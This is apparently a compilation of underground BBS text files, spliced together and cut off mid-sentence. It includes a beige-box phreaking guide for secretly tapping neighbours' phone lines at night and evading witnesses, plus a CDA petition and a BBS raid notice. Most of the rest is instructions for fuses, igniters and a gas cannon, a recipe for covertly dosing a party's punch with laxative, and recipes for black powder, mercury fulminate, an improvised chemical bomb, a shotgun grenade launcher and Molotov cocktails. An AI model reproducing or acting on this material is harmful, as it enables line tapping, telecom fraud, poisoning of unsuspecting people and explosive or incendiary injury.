on issue #5. Aparantly, I wasn't aware that UPS is installing their own
tracking system. The following message was taken from our WHQ, Symphony of
Sickness - (201) 728.3881.
 
    
>    The new issue of DAS is actually quite good.  You just forgot to
>mention(or you don't know) that UPS is in the process of setting up a nation
>wide cellular modem network.  Every UPS truck you see is going to have a 9600
>baud cellular modem in it.  When you sign for something it gets scanned and

>I wouldn't plan on using UPS for the sort of scam your doing much longer..
>
>                                            Tear Gas
 

        OK, so if you plan on doing that scam, make sure you don't use 
UPS. Its inevitable that soon all the postal services will be using 
tracking services. The key here is NOT to sign for it, because then the  
company will have proof that it arrived and you are screwed.
        So, you may have to use a drop site, not becuase this is 
dangerous, just because you don't want to sign for it.
Thanks to Tear Gas for the info on UPS.
        Last, we have a new 201 distribution site. Call Eve of Destruction
at 201-579-9387. They're a good board some give 'em a ring. The sysop 
there is Scatterbrain.
        BTW: This file will eventually be combined with many others in the
creation of the DaS Beginner's Guide to Phreaking. I also might release 
some other Field Ops Guides for other boxes or phreaking, hacking, or 
carding shit.


What this article is about
~~~~~~~~~~~~~~~~~~~~~~~~~~
        This article, among other things, will be seperated into a few
different catergories. 

I - The Beige Box Explanation
II - Setting up your beige box "run"
III - Initiating the "run"
IV - Hints for the "run"
V - Post - "run"
VI - More Runs

The Fundementals of the Beige Box
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        
        One of the first things any phreak will ever encounter is the 
Beige Box. It is an extremely simple and effective box. It was the first 
phreaking apparatus I ever tried and I'm sure alot of other phreaks also
started on it. 
        There are a few reasons why the beige box is the "primer" to the
phreaking world. First off, the beige box is extremely simple to construct.
Its takes very little skill to strip a wire and open a house protector (see
a later chapter for The House Protector). Even now, there are even simpler
forms of the beige box (which I discuss later) made for different "cans". 
        Beige boxing is very easy to do. Its hard to get caught, and it 
really gets the andrenalin pumping (at least for the first few times). 
        It'd hard to tell who first "invented" the beige box. The term 
"beige box" was coined by Jolly Roger, who showed us all the beige box in
the JRC III. The beige box also goes by a few other names. Most notably the
"bud box" and "day glo box". I'm unsure which of these came first, they all
probably hit the scene at about the same time.
        In any case, after the budding phreak tries beige boxing for the 
first time he'll be hooked on phreaking. I'd also like to make a note
that there are people now that just buy a "butt set", or the lineman's 
handset, better known as the beige box, instead of making one. They can 
just call up a telco supplier and order one. They can cost anywhere from 
$30 - $100. For the new phreak it is just easier to make one. If you'd 
still like to buy one I will put a list at the end of this file of
telco supply companies you can call. Thanks to SANctuary for that file
with the telco suppliers.

The Beige Box and how it works
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        
        The beige box is, simply put, a lineman's handset. Have you ever 
seen one of those extermely un-intellegeint primordial creatures we call
"linemen" hanging around your telephone poll? Has he opened that box up and
seems to playing with a phone up there? Well, that's now ordinary phone. 
It's "SuperPhone"! Yes, this is a "butt set", specially designed by Telco
equipment distributers for tapping into "protecters". These phones are 
used to test lines, ANI, etc. 
        Anyway, a beige box is simply a home-brew butt set. Its 
consruction is simple. I will not teach you how to create one, that is a  
different file.
        Just a note when your making your beige box. Try and buy the 
smallest, cheapest phone you find. It must have the numbers in the handset
and be able to plug in the jack directly from the handset (which should be
the only piece)
        So, you know all yur shit form reading the beige box plans, read 
on...

Planning Your Beige Box Run
~~~~~~~~~~~~~~~~~~~~~~~~~~~

        A phreaking encounter with the beige box, over a period of time,
hitting multiple houses is called a "run". This can take from 15 minutes 
to 6 hours. My personal longest time is about 4 hrs., hitting about 20 
homes.
        Well, the first thing you are going to need to do is decide on 
what night to do this on. Their are a few things to keep in mind:

o It's cold in the winter
o The summer is the best

        I'd suggest doing this in the summer or late spring/early fall. 
The weather is just right around these times to go out for a run. Now, 
find your night. Oh and a note, DO THIS AT NIGHT! It's not fun in the day!
You can get caught REAL easy...
        This can be ANY night. I suggest that you do this on a weeknight 
for several reasons. First, on a Friday or Saturday night people are liable 
to stay up late. On the other hand, if wait long enough, these people will
have passed out and won't hear a thing.
        Now you must decide WHO to take with you. NEVER, EVER take more 
than 3 friends. This causes ALOT of noise and your risk of getting caught 
is much higher.
        I personaly, take one friend and occasionaly two. Make sure
these people are good and trusted friends, don't bring along a Narc....
        These friends should be educated a little bit about what you are
going to be attemping. Anyone I take with me knows just as much as I do 
about the attempt we are going to make.

What to wear, what to wear
~~~~~~~~~~~~~~~~~~~~~~~~~~

        Well, now you're ready to go. Its time to start the final stages
of the run. Later on, I'll discuss the kit. Now I'll talk about what to 
wear.
        Finding out what to wear is simple, right? All black? Wrong. 
Although black is good there are other alternatives. These may be 
impractical, tough.
        Find a urban camo shirt, these work just as well an night as does
all black. This may not be a good idea though because they can get 
expensive, finding one in your size may or may not be hard, and sometimes
only T-Shirts can be found and this may lead to extreme coldness.

The Beige Box Kit
~~~~~~~~~~~~~~~~~

        Whenever you do ANY type of phreaking and/or anarchy that will take
you outside, especially at night you should always have a kit with you. I
take my kit wherever I go phreaking, it's quite handy.
        What is this kit? Well, the kit is usually a bunch of tools and 
various other objects/weapons and a beige box you bring with you when you
go beige boxing. These various tools with help you stay organized. 
        
Parts:
~~~~~~
o Bookbag 

o ScrewDrivers   

o Needlenosed Pliers 

o Pen Light  

o Beige Box 

o LOUD firecracker 

o Pen Knife
        
o Cigarettes, Beer, Wine, Pot, LSD, Etc.        

        I may have forgotten some stuff. Oh well. Now we will discuss each
part in detail. NOTE: When packing, if not properly packed, or bookbag is
loose the parts will jingle, and that is very annoying, and tends to give 
you away.

BOOKBAG: When choosing your bookbag there are a few things to keep in 
mind. First of all, you really won't need a huge bookbag, something fairly
small will do. Make sure there is an external pocket for small things. 
Also, when choosing MAKE SURE it is a black or dark blue, brown, or green 
color. That may be the most important thing to remember. Optionaly, you can 
get one with adjustable straps for minimum jingle of contents and maximum 
comfort. You can get a bookbag cheap almost anywhere, Salvation Army will 
probably have a good price, or if you have the right colors, you can use 
yours.


SCREWDRIVERS: These are of high importance. The most important thing to
remember is a flat head screwdriver. You should about 2 or 3 different 
sizes of the flat head. You should also pack two sizes of a Phillips head 
because these often come in handy. And for ultimate fun, pack a hex 
driver. I believe the size for it is 7/16s, but depending upon what you 
are opening, you may need smaller or larger sizes.

NEEDLENOSED PLIERS: These funky pliers are the next best thing to 
screwdrivers for opening things. Also if you don't have a hex driver or the 
proper size screwdriver, these will work fine, although a bit awkwardly. 
If you don't have needlenosed pliers, then you needn't go out and buy one,
they can get expensive.

PEN LIGHT: As I said a PEN LIGHT. DON'T bring your /<-K00L 6 D Cell Mag
Lite. That is not needed. A general-purpose 2 AA pen light is all you 
need, and you can easily get by with a smaller one. A very good light to
use are the MAg Lites. These lights are sturdy and VERY dependable, are 
made of aircraft aluminum, and are virtually indestructible. They also run
a high price. A 2 AA  can cost a good $25-$30.

BEIGE BOX: Or whatever else you are bringing. 

LOUD FIRECRACKER: No, this isn't for anarchy, it's for EMERGENCYS ONLY. 
You can use this when in a bad predicament. If someone has spotted you but 
are still far enough away, you light this fircracker and throw it in their 
general direction. This will draw their attention away long enough for you
to escape. Something with some fire or repetitive firecrackers, such as
Jumping Jacks or Japanese Uzis, also work quite well.

PEN KNIFE: It is also good to carry a pen knife around in your pocket. 
They have a multitude of uses, from stripping wire to self-defense. They
are good to carry around and I suggest you have one with you at all times. 
You might also want to consider a nice Bowe knife for REAL protection. Or
maybe a 9mm. <G>

CIGARETTES, ETC: Bring along your Marlboros and break out the Bud. These 
can be used for post-run celebration (I don't suggest boxing while drunk)
or to psych up before the run. You may also consider pot (not good idea
to box while high) or LSD (definetly not a good idea).


Initiating the Run
~~~~~~~~~~~~~~~~~~

        Well, its your selected night of the run. Your friends have come 
over for the night. Your ready. Good. What time to beige box? You can go 
as early as 11 PM or as late as 4 AM. Around  1-2 AM is really the best 
time because most people are asleep and you are still awake; at 4 AM you 
may be ready for sleep.
        Now that your friends are out go and hit the house nearest to you,
going in a line hitting all the houses. This is always much fun.

Hints for the run
~~~~~~~~~~~~~~~~~

        To stay undetected there are a few things you can do. First,
KEEP QUIET. That's fairly obvious so I won't press you on that one. 
Second, to avoid being spotted by cars stay close to the sides of houses
when you move around. Third, you may post a lookout person up further 
ahead.
        If you are ever caught by a neighbor, if he hasn't seen you yet, 
but knows your there, RUN! Run for your life because he probably has 
already called the cops. Throw your firecracker and run. NEVER, EVER run
in the direction to your house. 

Post-Run Festivities
~~~~~~~~~~~~~~~~~~~~

        After the run you can do whatever you want. I suggest you choose
item number 8 from the beige box kit.

OTHER STUFF
~~~~~~~~~~~

        Here is a little something I have noticed in my area and my 
solution to the problem. Around Northern NJ, and I know most of NJ, have
a different kind of house protecter than described in your normal beige 
box file. This house protecter is a gray box about 
1' high x 6" wide x 4" deep. The box says "Telephone Network Interface"
on the front. Near the bottom you will see a Phillips head screw and the
label: Customer Interface. The other side has a hex screw and is labled:
"Telco Access Only". You really only need the first side, but you can use 
your old beige box on the Telco side.
        When you open upon up the customer's side of the box you will see
a row of telephone jacks. Now you figure it out. It couldn't be more 
simple. Just plug in and have fun. The jacks near the bottom usually are 
the ones with the lines.
        The Telco side is really nothing but the old box you may be used 
to. You can use your old beige box on this side. I may do a little more 
investigating here, but I believe there isn't anything more you can do 
with it.
        If you haven't figured out a box for the "new" house protecter I 
suggest you shoot yourself. It's so simple I won't even name a box for it
we'll just call it the "Beige Box Strain A".
        Oh, and this dosen't come free. I have found that about 50% of
the house protectors in their basements. There is no way to access them
from the outside. In area's were there are no basements (LBI, for 
instance) the house protectors will always be outside.

Other Runs
~~~~~~~~~~

        One other fun thing you can try is to try and find your Central
Office's trunk line. Then follow the big wire out of the CO to the nearest 
telephone poll. Do you see a really big steel box on that telephone poll?
There's about 1000 (at least) lines sitting in there.
        There are a few snags with this, though. It is very easy to get
caught perched up their on telephone poll, a box bigger than you with its
door hanging open. Also these are usually locked.
        Another fun thing to do is to go trashing. If you don't know what
trashing is I suggest you check out the file BELTRASH.TXT which gives some
good advice on trashing.
        What you do is you work your way, during your run, towards the
central office. Then around 4 AM (this is the best time) just go trashing.
Trashing is lots of fun, and you can find alot of interesting stuff in your
CO's dumpster.

Conclusion

        Well, that about wraps it up fer this ish. Mad Arab should have a 
file coming out soon, and I'll see ya in April...

*** PROTECT THE INTERNET. READ THIS MESSAGE ***
 
This document is an electronic Petition Statement to the
U.S. Congress regarding pending legislation, the
"Communications Decency Act of 1995" (S. 314) which will
have, if passed, very serious negative ramifications for
freedom of expression on Usenet, the Internet, and all
electronic networks.  The proposed legislation would remove
guarantees of privacy and free speech on all electronic
networks, including the Internet, and may even effectively
close them down as a medium to exchange ideas and
information.
 
Time is of the essence, we are going to turn
this petition and the signatures in on 3/16/95, so if you
are going to sign this please do so ASAP or at least before
midnight Wednesday, March 15, 1995.
 
Even if you read this petition after the due date, please
submit your signature anyway as we expect Congress to
continue debating these issues in the foreseeable future
and the more signatures we get, the more influence the
petition will have on discussion.  And even if Congress
rejects S. 314 while signatures are being gathered, do
submit your signature anyway for the same reason.
 
Please do upload this petition statement as soon as
possible to any BBS and on-line service in your area.
If you have access to one of the major national on-line
services such as CompuServe, Prodigy, AOL, etc., do try
to upload it there.  We are trying to get at least 5000
signatures.  Even more signatures are entirely possible
if we each put in a little effort to inform others, such
as friends and coworkers, about the importance of this
petition to electronic freedom of expression.
 
******(2) The Petition Statement
 
In united voice, we sign this petition against passage of S. 314 (the
"Communications Decency Act of 1995") for these reasons:
 
S. 314 would prohibit not only individual speech that is "obscene, lewd,
lascivious, filthy, or indecent", but would prohibit any provider of
telecommunications service from carrying such traffic, under threat of
stiff penalty.  Even aside from the implications for free speech, this
would cause an undue - and unjust - burden upon operators of the various
telecommunications services.  In a time when the citizenry and their
lawmakers alike are calling for and passing "no unfunded mandates" laws
to the benefit of the states, it is unfortunate that Congress might seek to
impose unfunded mandates upon businesses that provide the framework for
the information age.
 
An additional and important consideration is the technical feasibility of
requiring the sort of monitoring this bill would necessitate.  The
financial burden in and of itself - in either manpower or technology to
handle such monitoring (if even legal under the Electronic Communications
Privacy Act) - would likely cause many smaller providers to go out of
business, and most larger providers to seriously curtail their services.
 
The threat of such penalty alone would result in a chilling effect in the
telecommunications service community, not only restricting the types of
speech expressly forbidden by the bill, but creating an environment
contrary to the Constitutional principles of free speech, press, and
assembly - principles which entities such as the Internet embody as
nothing has before.
 
By comparison, placing the burden for content control upon each individual
user is surprisingly simple in the online and interactive world, and there
is no legitimate reason to shift that burden to providers who carry that
content.  Unlike traditional broadcast media, networked media is
comparatively easy to screen on the user end - giving the reader, viewer,
or participant unparalleled control over his or her own information
environment.  All without impacting or restricting what any other user
wishes to access.  This makes regulation such as that threatened by this
S. 314 simply unnecessary.
 
In addition, during a period of ever-increasing commercial interest in
arenas such as the Internet, restriction and regulation of content or the
flow of traffic across the various telecommunications services would have
serious negative economic effects.  The sort of regulation proposed by this
bill would slow the explosive growth the Internet has seen, giving the
business community reason to doubt the medium's commercial appeal.
 
We ask that the Senate halt any further progress of this bill.  We ask
that the Senate be an example to Congress as a whole, and to the nation
at large - to promote the general welfare as stated in the Preamble to
the Constitution by protecting the free flow of information and ideas
across all of our telecommunications services.

it.
 
In addition, all e-mail signatures will be submitted to
Congress, the President of the United States, and the
news media.
 
Including your full name is optional, but *very highly
encouraged* as that would add to the effectiveness of the
petition.  Signing via an anonymous remailer is highly
discouraged, but not forbidden, as an attempt will be made
to separately tally signatures from anonymous remailers.
 
Because this is a Petition to the U.S. Congress, we ask

directions EXACTLY:
 
1) Prepare an e-mail message.  In the main body (NOT the
Subject line) of your e-mail include the ONE-LINE statement:
 
SIGNED <Internet e-mail address> <Full name> <US Citizen>
 
You need not include the "<" and ">" characters. 'SIGNED'
should be capitalized.  As stated above, your full name is
optional, but highly recommended.  If you do supply your
name, please don't use a pseudonym or nickname, or your
first name -- it's better to just leave it blank if it's
not your full and real name.  If you are a U.S. citizen,
please include at the end of the signature line a 'YES',
and if you are not, a 'NO'.  All signatures will be
tallied whether or not you are a U.S. Citizen

to make, send e-mail to me personally, and NOT to the
special petition e-mail signature address.
 
3) Send your e-mail message containing your signature to
the following Internet e-mail address and NOT to me:
 
              ===========================
                s314-petition@netcom.com
              ===========================
 
4) Within a few days of receipt of your signature, an
automated acknowledgment will be e-mailed to you for e-mail
address verification purposes.  You do not need to respond or
reply to this acknowledgement when you receive it.  We may
also contact you again in the future should we need more
information, such as who your House Representative and
Senators are, which is not asked here as it is unclear
whether such information is needed.
 
Thank you for signing this petition!

From   : Black One                        Status: Public Message
Subject: 514 BUST !! MONTREAL DESTROYED

Greetings friend,

              Do I know you by any chance? (i.e ex-Dread founder?), long
time no see, hope you remember me... I see that you've come back in the
scene, for my part it is quite the opposite, I'm retired... No time,
studying all the time! Argh...

While listening to the local radio station in my Area code (514), I heard
that 11 BIG AND GOOD pirate boards had been busted, as soon as I learned
the news I called one of my friend who is a sysop, and the news was
confirmed! I tried calling some bbs to check the news myself, and
Most boards that I tried calling were down!!
The police closed down 11 local BBS, including the following legendary
boards:

 Twins
 The Underworld
 Perfect Crime
 Red Alert
 Lineup
 Skull Island
 Restricted Area
 ...and 4 others...

Of course, once again, the reason why they got busted is because they
accepted paying users, who were in reality RCMP officers. Anyhow, my AC
(514) is now dead.... all the best and biggest are gone.  Watch
yourselves!!!

   You would be surprised how many files are out that use what falls under the
 category of a "fuse". They assume you just have a few lying around, or know
 where to get them. Well, in some parts of the country,fuses are extremely hard
 to come by...so this part of our first file is dedicated to fuses. Both are
 very simple to make, and are fairly reliable:


        Slow Burning Fuse (2 in. per minute approx.)
        =================

  Materials needed:
    ---> cotton string or 3 shoelaces
    ---> potassium nitrate or potassium chlorate
    ---> granulated sugar

  Procedure:
    1. wash the cotton string or shoelaces in HOT soapy water, then rinse
       with fresh water.

    2. mix the following together in a glass bowl:
        1 part potassium nitrate or potassium chlorate
        1 part granulated sugar
        2 parts hot water

    3. Soak strings or shoelaces in this solution.

    4. Twist/braid 3 strands together and allow them to dry.

    5. Check burn rate to see how long it actually takes.

 note: the few inches of this fuse to be inserted into the explosive device
       must be coated with a black-powder paste to ensure its reliability.



        Fast Burning Fuse (40 in. per minute)
        =================

  Materials needed:
         ---> soft cotton string
         ---> fine black powder
         ---> shallow dish or pan

  Procedure:
         1. moisten powder to form a paste
         2. twist/braid 3 strands of cotton together
         3. rub paste into string and allow to dry
         4. check burn rate

     1. light the candle and allow a large pool of molten wax to form in the
        top.
     2. take a single match and hold the glass part of a single diode against
        the head....bend the wires around the head so that one wraps in an
        upward direction and then sticks out to the side...do the same with
        the other wire, but in a down ward direction. The diode should now be
        hugging the match head, but its wires MUST NOT TOUCH EACH OTHER!!!!
     3. dip the match head in wax to give it a water-proof coat (these work
        under water)
     4. repeat steps 1 - 3 to make as many as you want
  
  How to use:
    When these little dudes are hooked across a 6vDC battery, the diode reaches
  what is called break-down voltage. When most electrical components reach this
  voltage, they usually produce great ammounts of heat and light, while quickly
  melting into a little blob. This heat is enough to ingite a match head. These
  are recomended for use under water, where most other ingniters refuse to
  work. Enjoy!

                             HOME-BREW BLAST CANON           
                             =====================

  Materials:
     ---> 1 plastic drain pipe, 3 feet long, at least 3 1/2 inches in diameter
     ---> 1 smaller plastic pipe, about 6 inches long, 2 inches in diameter
     ---> 1 large lighter, w/ fluid refills (this gobbles it up)
     ---> 1 pipe cap to fit the large pipe, 1 pipe cap to fit the smaller pipe
     ---> 5 feet of bell wire
     ---> 1 SPST rocker switch
     ---> 1 6v polaroid potapulse battery
     ---> 1 5v relay (get this at radio shack)
     ---> electrical tape
     ---> one free afternoon

  Procedure:
     1.  cut the bell wire into 3 equal pieces, and strip the ends
     2.  cut a hole in the side of the large pipe, the same diameter as the
         small pipe; thread the hole and one end of the small pipe. They should
         screw together easily.
     3.  take a piece of scrap metal, and bend it into an "L" shape, then
         attach it to the lever on the lighter like so:
                           /----------- gas switch is here
                 ________  V
                /        \__-----\
                ! lighter   !    !  <--- metal lever
                !           !    !
                !           !
          Now, every time you pull the "trigger", gas should flow freely from
          the lighter; you may need to enlarge the "gas port" on the lighter,
          if you wish to be able to fire more rapidly.
      4.  connect 2 wires to the two posts on the switch
      5.  cut to holes in the side of the smaller tube, one for the switch on
          the bottom, and one for the metal piece on top; then mount the switch
          in the bottom, running the wires up and out the top; mount the 
          lighter/trigger in the top; now the switch should rock easily, and
          the trigger should cause the lighter to pour out gas. Re-screw the
          smaller tube into the larger one, hold own the trigger a bit, let it
          go, and throw a match in there; if all goes well, you should get a
          nice big "THUD!"
      6.  get hold of the relay, and take off the top:

           Connect (1) to one of the wires comming from the switch; connect
           (2) to (4), and connect (5) to one side of the battery; connect the
           remaining wire from the switch to the other side of the battery;
           now you should be able to get the relay to make a little "buzzing"
           sound when you flip the switch and you should see some tiny little
           sparks.
       7.  now, carefully mount the relay on the inside of the large pipe,
           towards the back; screw on the smaller pipe; tape the battery to
           the side of the canon barrel (yes, but looks arent everything)
       8.  you should now be able to let a little gas into the barrel and
           set it off by flipping the switch.
       9.  put the cap on the back end of the large pipe VERY SECURELY. You
           are now ready for the first trial-run.

  To Test:

       Put something very very large into the barrel, just so that in fits
    "just right". Now, find a strong guy (the recoil will probably knock you
    over if you arent careful). Put on a shoulder pad, and earmuffs, and 
    possibly some other protective clothing. Hold the trigger down for 30
    seconds, hold on tight, and hit the switch. With luck and the proper
    adjustments, you should be able to put a frozen orange through 1/4 plywood
    at 25 feet. Have phun!

Diarihhea Party                                 A CookBook Fav'!
---------------
     Can you recall your freshman lab-sciencce course in high school?  Do you
remember that nasty smelling pink stuff you used called PHENOPHALINE 
[PHENOLPHTHALEIN (C6H4OH)2COC6H4CO]? Well this PHENOPHALINE is used to 
indicate wether or not a substance is acidic, or basic. Well anyway.. The 
truth has come to light that Phenophaline is a very strong laxitive (causes 
the runs) and it is also skin absorbant! 

 Here's what you do-->

1. Get one of those DRENCH squirt guns that pump out a quart of water in less
   than 5 seconds.

2. Fill it up with your favorite brand of Phenophaline.

3. Sneak up on you unsuspecting victem.

4. Blast the heck out of him.

5. Follow him to the nearest public restroom and bring along a tape recorder
   for future blackmail purposes.

 Now for The Party--->

1. Enter the house of your victem on the night of his party.
2. Find the punchbowl.
3. Pour in what you would call a appropriate dosage (considering that it is a
   very strong laxitive)
4. Take out the camcorder and enter the bathroom.
5. Stay in the bathroom.
6. Tie up the bathroom, and wait for pounding on the door.
7. Open up and get out quickly.
8. Set the Camcorder on <RECORD>.
9. Call the vidio----> The Party Bathroom Riot

                              MCI - Legal Scam
*****************************************************************************

MCI - Long Distance Carrier


        MCI has a promotional item for small or large business.  The special
is this.  If you are to sign up with MCI they will give you $1,000.00 of free
long distance for the period of one billing period (usually 30 days but some-
times 28).  They pay for the switch over and your on your way to calling all
the LD Systems you want.

        We did this and tried to accumulate the maximum amount of $1,000.00
in one billing period and to no avail.  We only managed to get it up around
$700.00 buxs or so.  We got a ton of files and at no cost to us.  If you are
to keep MCI you are eligible for this special again in 13 months.

        If you are fortunate to have a small business or at least have a 
phone that is registered as a small business the take advantage of this.  
Once you are finished swith back to AT&T (or whoever) and get the $50.00 LD
bonus.  We are very fortunate to have a couple small busniess(s) and have 
done this again and again..  Best thing is its LEGAL!  No calling cards, no
credit card calls, no phreaking.  Just legal calling at the expense of MCI!

        Now for those of you who think $1,000.00 is not much in LD.  Well we
had (2) lines going at it.  Average of about (4) hours a day, primetime. And
we didn't get to close.  Sure if you manage to get on a system that lets you
transfer for 8 hours a day you could catch up with it.  Just be smart and 
you will be fine.

HOW TO MAKE GREEK FIRE
----------------------

   1 PARTS  SULFUR (LIVE)
   2 PARTS  CHARCOAL (OF WILLOW)
   6 PARTS  SALTPETRE (POTASSIUM NITRATE)

GRIND EACH ELEMENT INTO A FINE POWDER SEPERATLEY WITH A MORTAR AND MIX.

WHEN LIT AND THROWN FLAMING, IT CARRIES THE FLAME WHEREVER IT GOES AND
SPLATTERS FIRE WHERE IT LANDS.

THE GREEKS USED THIS TO WIN WAR AT SEA.  THE ENEMY HAD NEVER SEEN ANYTHING
LIKE IT AND EVENTUALLY PERISHED.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- =-=-=-=-=-=-=-=-=-=-

HOW TO MAKE GUN PROPELLANT
--------------------------

   1.0 PARTS  SULFUR
   1.5 PARTS  CHARCOAL (CARBON)
   7.5 PARTS  SALTPETRE (POTASSIUM NITRATE)

(LOOKS FARMILIAR...)
AS WITH GREEK FIRE, IT IS GROUND SEPERATELY AND MIXED.

THIS FORMULAE PRODUCES GUN PROPELLANT THAT BURNS AT 1312 FEET PER SECOND.
OR 400 METERS PER SECOND IF YOU THINK IN METRIC.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- =-=-=-=-=-=-=-=-=-=-

MERCURY FULMINATES
------------------
MERCURY FULMINATE IS A MEDIUM-POWER EXPLOSIVE THAT IS COMMONLY USED IN BLASTING
CAPS, DETONATING DEVICES IN GENERAL, AND AS A STAND-ALONE EXPLOSIVE.
ALL FULMINATES, INCLUDING MERCURY FULMINATE, ARE SENSITIVE TO SHOCK AND
FRICTION, AND IN NO CIRCUMSTANCES SHOULD THEY BE HANDLED IN A ROUGH OR
CARELESS MANNER.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- =-=-=-=-=-=-=-=-=-=-

MERCURY FULMINATE 1 (SHOCK BOMB)
---------------------------------

SHOCK BOMBS, OR MORE PROPERLY, FULMINATE OF MERCURY [HG(ONC)2], ARE BOMBS THAT
EXPLODE WHEN JOLTED IN ANY WAY, SUCH AS LANFING ON SOMEONE'S FEET OR SHOT FROM
A DISTANCE WITH A BB GUN.

ADD MERCURY (FOUND IN THERMOMETERS AND STRANGE GADGETS AT RADIO SHACK) TO
NITRIC ACID (CHEMICALS CATALOGS).  DON'T TOUCH THE MERCURY.  NOW CAREFULLY ADD
ALCOHOL (RUBBING ALCOHOL OR ANYTHING: DRUG OR GROCERY STORE) TO THE MIXTURE AND
VOILA!  INSTANT SHOCK BOMB.

I RECCOMEND RIPPING THE TOP OFF OF A COKE CAN AND STUFFING A PAPER TOWEL IN
TO MAKE IT LESS LIKELY TO BLOW UP WHEN YOU DON'T WANT.  GENTLY TRANSFER THE
MIXTURE TO THE COKE CAN AND, IF YOU WANT, IT WITH ANOTHER CAN TO MAKE IT LOOK
MORE INNOCENT.

NOW PLACE IT SOMEWHERE AND THROW A ROCK AT IT, SHOOT IT WITH A WRISTROCKET OR
BB GUN AND BOOM!

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- =-=-=-=-=-=-=-=-=-=-

MERCURY FULMINATE 2
--------------------

[-1-]   TAKE 5 GRAMS OF PURE MERCURY AND MIX IT WITH 35 ML. OF NITRIC ACID.

[-2-]   THE MIXTURE IS SLOWLY AND GENTLY HEATED.  AS SOON AS THE SOLUTION
        BUBBLES AND TURNS GREEN, ONE KNOWS THAT THE SILVER MERCURY IS
        DISSOLVED.

[-3-]   AFTER IT IS DISSOLVED, THE SOLUTION SHOULD BE POURED, SLOWLY, INTO
        A SMALL FLASK OF ETHYL ALCOHOL.  THIS WILL RESULT IN RED FUMES.
[-4-]   AFTER A HALF HOUR OR SO, THE RED FUMES WILL TURN WHITE, INDICATING
        THAT THE PROCESS IS NEARING ITS FINAL STAGE.

[-5-]   AFTER A FEW MINUTES, ADD DISTILLED WATER TO THE SOLUTION.
[-6-]   THE ENTIRE SOLUTION IS NOW FILTERED, IN ORDER TO OBTAIN THE SMALL
        WHITE CRYSTALS.  THESE CRYSTALS ARE PURE MERCURY FULMINATE, BUT SHOULD
        BE WASHED MANY TIMES, AND TESTED WITH LITMUS PAPER FOR ANY REMAINING
        UNDESIRABLE ACID.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- =-=-=-=-=-=-=-=-=-=-

MERCURY FULMINATE 3
--------------------

[-1-]   MIX ONE PART MERCURIC OXIDE WITH TEN PARTS AMMONIA SOLUTION.  WHEN
        RATIOS ARE DESCRIBED, THEY ARE ALWAYS DONE ACCORDING TO WEIGHT
        RATHER THAN VOLUME.

[-2-]   AFTER WAITING EIGHT TO TEN DAYS, ONE WILL SEE THAT THE MERCURIC OXIDE
        HAS REACTED WITH THE AMMONIA SOLUTION TO PRODUCE THE WHITE FULMINAVE
        CRYSTALS.

[-3-]   THESE CRYSTALS MUST BE HANDLED IN THE SAME WAY AS METHOD 2 ABOVE, IN
        THAT THEY MUST BE WASHED MANY TIMES AND GIVEN SEVERAL LITMUS PAPER
        TESTS.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- =-=-=-=-=-=-=-=-=-=-

HOW TO MAKE A HIGH SCHOOL BOMB
------------------------------

I WOULDN'T KNOW ABOUT THIS BUT THE LOCAL NEWSPAPER REPORTED A STORY ON A CAR
BEING TOTALED AND A LADY SUFFERING SERIOUS BURNS ON HER TORSO AFTER IT EXPLODED
IN HER LAP ON THE 4TH OF JULY.  ANYWAY THEY REPORTED THE FORMULA USED...  EASY.

ADD CLORINE TO BRAKE FLUID IN A GLASS BOTTLE AND RUN.

DON'T ASK WHY IT'S CALLED A HIGH SCHOOL BOMB, THAT'S JUST WHAT FRIENDS OF MINE
WHO ALREADY KNEW ABOUT IT CALLED IT.

-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=- =-=-=-=-=-=-=-=-=-=-

CONVERTING A SHOTGUN INTO A GERNADE LAUNCHER
--------------------------------------------

A 12- OR 16-GAUGE SHOTGUN IS PROPPED UP WITH A SET OF FOLDING LEGS, SO AS TO
FORM A TRIPOD, WITH THE BUTT OF THE GUN BEING THE THIRD LEG AT ABOUT A 45-
DEGREE ANGLE.  THE ANGLE CAN BE VARIED, FOR AIMING, BY MOVING THE LEGS BACK AND
FORTH.  TO BUILD A GRENADE LAUNCHER, ONE MUST TAKE AN OPEN SHELL AND REMOVE
ALL THE SHOT.  ONCE THIS IS DONE, REPLACE IT WITH A SMOOTH CYLINDRICAL STICK,
WHICH HAS BEEN CUT DOWN TO A CLOSE FIT.  WHEN THE SHELL IS LOADED INTO THE
GUN, THE STICK SHOULD EXTEND OUT THE MUZZLE OF THE GUN.  TO THE EXTENDED
RORTION, A FLAT RUBBER BASE SHOULD BE FIXED AND A "MOLOTOV COCKTAIL" PLACED
ON IT.  THIS WILL SEND THE BURNING BOTTLES OVER A HUNDRED YARDS WITH A GOOD
FEAL OF ACCURACY.  THIS IS A GOOD WEAPON FOR ENCIRCLEMENT.

HOW TO MAKE A GOOD MOLOTOV COCKTAIL
-----------------------------------
A "MOLOTOV COCKTAIL" IS A BOTTLE FILLED WITH A FLAMMABLE LIQUID SUCH AS
GASOLINE, MIXED WITH OIL OR SOAP POWDER TO THICKEN IT.  A FUSE, USALLY A RAG
SOAKED IN GASOLINE, IT ATTACHED TO THE CORK, LIT, AND THROWN.  THE BOTTLE
BREAKS ON CONTACT WITH ANOTHER HARD OBJECT, AND THE GASOLINE IGNITES, CAUSING
A BURST OF FLAME.  THESE WERE USED WITH A GREAT DEGREE OF SUCCESS IN HUNGARY,
AGAINST THINGS AS BIG AS TANKS.

HERE ARE FIFTY-SIX FORMULAS FOR AMMONIUM NITRATE COMPOUNDS.  AMMONIUM NITRATE
IS A NEAT EXPLOSIVE THAT CAN BE DETONATED WITH ALMOST ANYTHING.

THERE ARE TWO REASONS FOR LISTING ALL FIFTY-SIX COMPUNDS.  FIRST, THEY ARE
